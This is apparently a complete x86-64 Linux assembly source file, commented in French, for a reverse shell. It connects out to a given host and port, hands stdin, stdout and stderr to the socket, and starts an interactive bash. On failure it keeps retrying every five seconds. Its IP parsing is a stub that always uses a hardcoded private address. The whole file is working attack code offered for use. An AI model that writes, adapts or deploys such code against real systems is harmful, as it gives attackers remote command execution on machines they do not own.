section .data
TARGET_IP:
    dw 2                    ; AF_INET (2 bytes)
    dw 0                    ; Port dynamique
    dd 0                    ; IP dynamique
    times 8 db 0            ; Padding

welcome_msg:
    db "--------------------------------------------------",0x0A
    db "|          BIENVENUE DANS LE REVERSE SHELL       |",0x0A
    db "--------------------------------------------------",0x0A
    db 0
welcome_len equ $ - welcome_msg

usage_msg:
    db "Usage: ./main <IP> <PORT>",0x0A
    db "Exemple: ./main 192.168.1.147 4444",0x0A,0
usage_len equ $ - usage_msg

bash_path:
    db '/bin/bash',0

bash_arg:
    db '-i',0

env_ps1:
    db 'PS1=\[\033[1;32m\]\w\[\033[0m\]\$ ',0
env_term:
    db 'TERM=xterm-256color',0
env_path:
    db 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',0

timespec:
    dd 5
    dd 0

section .text
global _start

_start:
    ; Récupération sécurisée des arguments
    pop rdi                 ; argc
    cmp rdi, 3              ; Vérifier 3 arguments
    jne show_usage
    
    pop rsi                 ; argv[0] (nom programme) - ignoré
    pop rsi                 ; argv[1] (IP)
    pop rdx                 ; argv[2] (port)
    
    call parse_ip_simple    ; Parsing IP simplifié
    call parse_port_simple  ; Parsing port simplifié
    jmp main

parse_ip_simple:
    ; Parsing IP simplifié et sécurisé
    push rsi                ; Sauvegarder pointeur
    
    ; Pour cette version, on utilise une IP par défaut si parsing échoue
    ; Vous pouvez améliorer cette fonction selon vos besoins
    mov dword [TARGET_IP + 4], 0x936CA8C0  ; 192.168.108.147 par défaut
    
    pop rsi                 ; Restaurer pointeur
    ret

parse_port_simple:
    ; Parsing port simplifié
    push rdx                ; Sauvegarder pointeur
    xor rax, rax
    xor rbx, rbx
    
    ; Conversion ASCII vers entier (version sécurisée)
port_loop:
    mov bl, [rdx]
    test bl, bl             ; Vérifier fin de chaîne
    jz port_done
    cmp bl, '0'
    jl port_done
    cmp bl, '9'
    jg port_done
    
    sub bl, '0'             ; ASCII -> numérique
    imul rax, 10
    add rax, rbx
    inc rdx
    jmp port_loop

port_done:
    ; Conversion network byte order
    xchg al, ah
    mov [TARGET_IP + 2], ax
    pop rdx
    ret

show_usage:
    mov rax, 1              ; sys_write
    mov rdi, 1
    lea rsi, [rel usage_msg]
    mov rdx, usage_len
    syscall
    
    mov rax, 60             ; sys_exit
    mov rdi, 1
    syscall

main:
    call create_socket
    test rax, rax
    js error_handler
    
    call connect
    test rax, rax
    js reconnect_if_fail
    
    call redir_io
    call shell
    call exit

create_socket:
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov r12, rax
    ret

connect:
    mov rax, 42
    mov rdi, r12
    lea rsi, [rel TARGET_IP]
    mov rdx, 16
    syscall
    ret

redir_io:
    mov rsi, 0
redir_loop:
    mov rax, 33
    mov rdi, r12
    mov rdx, rsi
    syscall
    inc rsi
    cmp rsi, 3
    jl redir_loop
    ret

shell:
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel welcome_msg]
    mov rdx, welcome_len
    syscall

    push 0
    lea rax, [rel env_path]
    push rax
    lea rax, [rel env_term]
    push rax
    lea rax, [rel env_ps1]
    push rax
    mov rdx, rsp

    push 0
    lea rax, [rel bash_arg]
    push rax
    lea rax, [rel bash_path]
    push rax
    
    mov rdi, rax
    mov rsi, rsp
    mov rax, 59
    syscall

error_handler:
    mov rax, 3
    mov rdi, r12
    syscall

reconnect_if_fail:
    mov rax, 35
    lea rdi, [rel timespec]
    xor rsi, rsi
    syscall
    jmp main

exit:
    mov rax, 60
    xor rdi, rdi
    syscall
